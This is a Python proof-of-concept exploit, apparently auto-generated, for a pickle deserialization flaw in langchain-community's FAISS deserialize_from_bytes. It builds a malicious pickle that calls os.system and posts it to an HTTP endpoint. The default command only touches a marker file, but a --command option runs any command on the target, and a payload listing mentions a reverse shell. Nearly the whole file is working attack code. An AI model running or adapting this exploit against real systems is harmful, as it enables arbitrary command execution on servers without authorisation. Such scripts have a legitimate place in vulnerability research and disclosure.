#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_calls_deserialize_from_bytes_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only FAISS deserialization.

Vulnerability: deserialize_from_bytes() calls pickle.loads() on attacker-controlled
bytes without any validation. This allows arbitrary code execution during deserialization.

The exploit targets the FAISS vector store's deserialize_from_bytes class method,
which is exposed as a public API. By crafting a malicious pickle payload, we can
execute arbitrary commands on the server.

WARNING: This PoC uses a benign payload (touch /tmp/poc_success.txt) to demonstrate
the vulnerability without causing harm.
"""

import pickle
import os
import sys
import subprocess
import base64
import requests
import argparse
import time

# =============================================================================
# Configuration
# =============================================================================
TARGET_URL = "http://localhost:8000/api/v1/trigger"  # Default target
TIMEOUT = 10  # Request timeout in seconds

# =============================================================================
# Malicious Pickle Payload Generation
# =============================================================================

class Exploit:
    """Class that executes arbitrary command when unpickled."""
    def __reduce__(self):
        # Benign payload: create a marker file to prove RCE
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def generate_malicious_pickle():
    """
    Generate a malicious pickle payload that executes a benign command.
    
    The payload uses __reduce__ to execute os.system() with our command
    during deserialization.
    """
    payload = pickle.dumps(Exploit())
    return payload

def generate_payload_with_command(command):
    """
    Generate a malicious pickle payload with a custom command.
    
    Args:
        command: String command to execute on the target
        
    Returns:
        bytes: Pickled malicious payload
    """
    class CustomExploit:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(CustomExploit())

# =============================================================================
# Exploit Execution
# =============================================================================

def send_exploit(target_url, payload, timeout=TIMEOUT):
    """
    Send the malicious pickle payload to the vulnerable endpoint.
    
    The payload is base64 encoded to ensure safe transmission over HTTP.
    
    Args:
        target_url: URL of the vulnerable endpoint
        payload: Raw pickle bytes to send
        timeout: Request timeout in seconds
        
    Returns:
        requests.Response object if successful, None on failure
    """
    # Encode payload as base64 for safe HTTP transmission
    encoded_payload = base64.b64encode(payload).decode('utf-8')
    
    # Prepare the request data - the vulnerable function expects bytes
    # In a real scenario, this might be sent as form data, JSON, or raw bytes
    # We'll try multiple common formats
    headers = {
        'Content-Type': 'application/octet-stream',
        'X-Payload-Type': 'pickle'
    }
    
    try:
        # Attempt 1: Send as raw bytes in request body
        print(f"[*] Sending exploit to {target_url}")
        print(f"[*] Payload size: {len(payload)} bytes")
        
        response = requests.post(
            target_url,
            data=payload,
            headers=headers,
            timeout=timeout
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        return response
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed - target may be unreachable")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Error sending exploit: {e}")
        return None

def verify_exploit_success():
    """
    Verify if the exploit was successful by checking for the marker file.
    
    This function should be run ON the target system (e.g., via SSH or
    another command execution) to confirm the payload executed.
    
    Returns:
        bool: True if marker file exists, False otherwise
    """
    try:
        result = subprocess.run(
            ['ls', '-la', '/tmp/poc_success.txt'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            print("[+] SUCCESS: Marker file /tmp/poc_success.txt exists!")
            print(f"[+] File details: {result.stdout}")
            return True
        else:
            print("[-] Marker file not found")
            return False
    except Exception as e:
        print(f"[-] Error checking for marker file: {e}")
        return False

# =============================================================================
# Main Exploit Logic
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langchain-community FAISS deserialization RCE"
    )
    parser.add_argument(
        '--target',
        default=TARGET_URL,
        help=f'Target URL (default: {TARGET_URL})'
    )
    parser.add_argument(
        '--command',
        default='touch /tmp/poc_success.txt',
        help='Command to execute (default: touch /tmp/poc_success.txt)'
    )
    parser.add_argument(
        '--verify',
        action='store_true',
        help='Verify exploit success locally (requires local execution)'
    )
    parser.add_argument(
        '--list-payloads',
        action='store_true',
        help='List available payload types'
    )
    
    args = parser.parse_args()
    
    if args.list_payloads:
        print("[*] Available payload types:")
        print("  1. Benign: touch /tmp/poc_success.txt (default)")
        print("  2. Custom: any command via --command")
        print("  3. Reverse shell: requires netcat listener")
        return
    
    print("[*] langchain-community FAISS Deserialization RCE PoC")
    print("[*] =================================================")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")
    print()
    
    # Generate the malicious pickle payload
    print("[*] Generating malicious pickle payload...")
    
    if args.command == 'touch /tmp/poc_success.txt':
        payload = generate_malicious_pickle()
    else:
        payload = generate_payload_with_command(args.command)
    
    print(f"[*] Payload generated: {len(payload)} bytes")
    print(f"[*] Base64: {base64.b64encode(payload).decode('utf-8')[:100]}...")
    print()
    
    # Send the exploit
    print("[*] Sending exploit to target...")
    response = send_exploit(args.target, payload)
    
    if response is None:
        print("[-] Exploit delivery failed")
        sys.exit(1)
    
    print()
    print("[*] Exploit delivered. Checking for execution...")
    
    # If we can verify locally (e.g., running on the target)
    if args.verify:
        time.sleep(1)  # Give the command time to execute
        if verify_exploit_success():
            print("[+] Exploit successful!")
        else:
            print("[-] Could not verify exploit success")
    else:
        print("[*] To verify, check if /tmp/poc_success.txt exists on the target")
        print("[*] Or run with --verify if executing locally")
    
    print()
    print("[*] Exploit complete.")

if __name__ == "__main__":
    main()
